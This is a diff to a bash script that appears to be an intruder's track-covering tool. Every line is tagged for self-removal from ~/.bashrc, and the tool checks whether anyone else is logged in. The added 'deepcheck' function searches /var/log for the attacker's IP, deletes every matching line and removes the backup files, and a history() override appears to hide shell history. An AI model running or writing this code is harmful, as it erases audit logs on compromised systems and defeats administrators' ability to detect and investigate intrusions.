@@ -53,6 +53,19 @@ function CL { #_fdsagadsfasdgadsgsss
     gglog "no cl to found" #_fdsagadsfasdgadsgsss
     fi #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
+deepcheck() { #_fdsagadsfasdgadsgsss
+    # echo -ne "found and delete or only found [y/other]:${UNDERLINE}" #_fdsagadsfasdgadsgsss
+    # read FOUND_DELE #_fdsagadsfasdgadsgsss
+    gglog "deep check if $my_ip in logs"
+    # echo -e "${REST}clear [${FOUND_DELE}]" #_fdsagadsfasdgadsgsss
+    for f in $(grep -Ilr "$my_ip" /var/log/);do #_fdsagadsfasdgadsgsss
+        gglog "$my_ip exists in $f." #_fdsagadsfasdgadsgsss
+        sed -ie "/$my_ip/d" $f; #_fdsagadsfasdgadsgsss
+        if [ -f ${f}e ];then #_fdsagadsfasdgadsgsss
+          rm ${f}e; #_fdsagadsfasdgadsgsss
+        fi #_fdsagadsfasdgadsgsss
+    done #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
 function ByeHack { #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_1ogout #_fdsagadsfasdgadsgsss
@@ -90,6 +103,7 @@ if [ $(( $(w|grep pts | wc -l ) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
     _ki $my_pts #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
     gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
+    deepcheck  #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
 history() { #_fdsagadsfasdgadsgsss
   cat $HOME/.bash_history; #_fdsagadsfasdgadsgsss
